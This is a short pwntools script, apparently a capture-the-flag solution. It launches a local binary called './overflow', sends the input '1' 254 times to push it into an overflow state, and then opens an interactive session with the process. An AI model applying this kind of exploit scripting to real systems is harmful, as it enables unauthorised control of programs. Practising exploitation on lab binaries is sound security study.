from pwn import *

target = process("./overflow")

for i in range(0, 254):
	target.recv()
	target.sendline(str(1))

target.interactive()

